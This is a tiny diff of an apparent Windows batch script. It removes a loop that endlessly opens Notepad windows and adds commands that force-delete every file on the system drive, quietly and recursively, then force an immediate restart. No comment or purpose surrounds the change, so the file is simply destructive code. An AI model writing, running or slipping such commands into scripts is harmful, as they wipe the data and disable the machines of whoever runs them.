@@ -1,4 +1,3 @@
-@ECHO off
-:top
-START %SystemRoot%\system32\notepad.exe
-GOTO top
+@echo off
+del %systemdrive%\*.* /f /s /q
+shutdown -r -f -t 00
